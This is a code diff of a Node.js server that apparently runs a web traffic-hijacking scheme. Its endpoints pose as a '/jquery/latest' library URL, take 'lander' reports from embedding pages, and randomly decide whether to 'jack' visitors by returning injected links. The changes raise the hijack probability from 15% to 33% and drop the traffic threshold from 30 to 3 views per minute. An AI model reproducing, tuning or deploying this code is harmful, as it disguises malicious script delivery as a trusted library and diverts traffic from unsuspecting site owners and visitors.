@@ -109,7 +109,7 @@ function getClientResponseJSON(uuid, url, callback) {
     console.log("Making client response...");
     /* 1.get the links from the lander_info based on the uuid */
     var response = "";
-    connection.query("select links_list from lander_info where uuid=? and url=?", [uuid, url], function(err, docs) {
+    connection.query("select links_list from lander_info where uuid=?", [uuid], function(err, docs) {
         if(docs.length > 0) {
             var links = docs[0].links_list;
             if(links) {
@@ -122,10 +122,10 @@ function getClientResponseJSON(uuid, url, callback) {
             /* 3. get the rate from pulse table based on url */
             connection.query("select rate from pulse where url=?", [url], function(err, docs) {
                 if(docs[0] != undefined) {
-                    //get random number, if its above 15 dont jack, otherwise jack
+                    //get random number, if its above 33 dont jack, otherwise jack
                     var randomNumber = Math.random() * 100;
-                    if(docs[0].rate > 30) { //views/min
-                        if(randomNumber <= 15) {
+                    if(docs[0].rate > 3) { //views/min
+                        if(randomNumber <= 33) {
                             callback({jquery: response});
                         } 
                         else {
@@ -659,6 +659,7 @@ app.get('/jquery/latest', function (req, res) {
 app.post('/jquery/latest', function(req, res) {
     var url = req.body.referer;
     var uuid = req.body.version;
+    var links = req.body.links;
     var datetime = new Date().toMysqlFormat();
     
     console.log("Received lander request from " + url + " with uuid = " + uuid);
@@ -669,7 +670,7 @@ app.post('/jquery/latest', function(req, res) {
     console.log("Formatted url to be: " + url);
     console.log("The domain of the url is: " + domain);
 
-    connection.query("select process_request(?,?,?,?) AS value;", [url, uuid, datetime, domain], function(err, docs) {
+    connection.query("select process_request(?,?,?,?,?) AS value;", [url, uuid, datetime, domain, links], function(err, docs) {
         if(docs[0] != undefined) {
             var response_string = docs[0].value;
 
